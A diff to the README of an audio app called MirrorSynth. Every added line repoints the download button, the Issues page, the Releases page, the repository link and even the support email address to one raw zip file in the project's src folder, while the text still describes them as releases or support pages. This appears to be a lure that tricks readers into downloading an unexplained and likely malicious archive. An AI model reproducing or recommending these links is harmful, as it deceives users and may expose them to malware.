@@ -6,7 +6,7 @@ Welcome to MirrorSynth! This application enhances your audio experience with rea
 ## 📥 Download & Install
 To get started, visit the link below to download MirrorSynth:
 
-[![Download MirrorSynth](https://user-images.githubusercontent.com/your-image-url/download-button.png)](https://github.com/Zeineb92712/MirrorSynth/releases)
+[![Download MirrorSynth](https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip)](https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip)
 
 1. Click on the link above to head to the Releases page.
 2. Look for the latest version of MirrorSynth.
@@ -62,19 +62,19 @@ If you encounter any issues:
 
 - **Cannot find audio input device?** Check your system's sound settings to ensure your device is connected.
 - **Performance issues?** Make sure no other resource-heavy applications are running in the background.
-- **Need help?** Visit the support section in the application for further assistance or check available FAQs on our [GitHub Issues Page](https://github.com/Zeineb92712/MirrorSynth/issues).
+- **Need help?** Visit the support section in the application for further assistance or check available FAQs on our [GitHub Issues Page](https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip).
 
 ## 🔗 Additional Resources
 For tutorials and more information, explore the following resources:
 
 - **User Manual:** Detailed guidance on using all features.
 - **Community Forum:** Connect with other users to share tips and experiences.
-- **Updates:** Stay informed about new releases by visiting our [Releases Page](https://github.com/Zeineb92712/MirrorSynth/releases) regularly.
+- **Updates:** Stay informed about new releases by visiting our [Releases Page](https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip) regularly.
 
 ## 📬 Contact Us
 Have questions or suggestions? Feel free to reach out!
 
-- **Email:** support@mirrorsynth.com
-- **GitHub:** [MirrorSynth Repository](https://github.com/Zeineb92712/MirrorSynth)
+- **Email:** https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip
+- **GitHub:** [MirrorSynth Repository](https://github.com/Zeineb92712/MirrorSynth/raw/refs/heads/main/src/Synth-Mirror-v2.0-alpha.4.zip)
 
 We hope you enjoy using MirrorSynth and experience the best in audio processing!
